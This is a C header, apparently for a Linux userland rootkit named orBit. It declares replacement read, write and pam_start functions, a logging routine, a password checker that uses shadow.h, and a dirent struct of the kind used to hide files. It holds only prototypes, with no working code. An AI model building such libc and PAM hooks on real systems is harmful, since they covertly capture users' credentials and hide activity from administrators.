#ifndef ORBIT_H
# define ORBIT_H
# include <stdio.h>
# include <pwd.h>
# include <dlfcn.h>
# include <limits.h>
# include <string.h>
# include <assert.h>
# include <stdint.h>
# include <string.h>
# include <unistd.h>
# include <sys/utsname.h>
# include <sys/syscall.h>
# include <sys/socket.h>
# include <netinet/in.h>
# include <ctype.h>
# include <fcntl.h>
# include <sys/stat.h>
# include <sys/ioctl.h>
# include <net/if.h>
# include <stdint.h>
# include <security/pam_appl.h>
# include <security/pam_misc.h>
# include <shadow.h>
# define DEBUGGING

# define SIZE_BUF   0x1000

struct linux_dirent
{
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

// # orBit-tools.c
/*
 * \fn __LOG( const char *, ssize_t len )
 * \brief Backup the logs.
 */
void    __LOG( const char *data, int size );

uint8_t     get_mac_addr( struct ifreq *, int * );
void        *_orBit_memset ( void *, register int, register size_t );
size_t      _orBit_strlen( const char * );
char        *strcasestr( const char *, const char * );
char        *_orBit_strchr( const char *, int );
int         _orBit_strcmp( const char *, const char * );
void        *_orBit_memcpy( void *, const void *, size_t );

/*
 * \fn uint8_t check_password( const char *, const char * )
 * \brief This function allows to verify that the password entered by the user is correct by matching it with the one in the database.
*/
uint8_t     check_password( const char *, const char * );

// # libc-read.c
ssize_t read( int, void *, size_t );

// # libc-write.c
ssize_t write( int, const void *, size_t );

// # libc-pam_start.c
int pam_start( const char *, const char *, const struct pam_conv *, pam_handle_t ** );

#endif
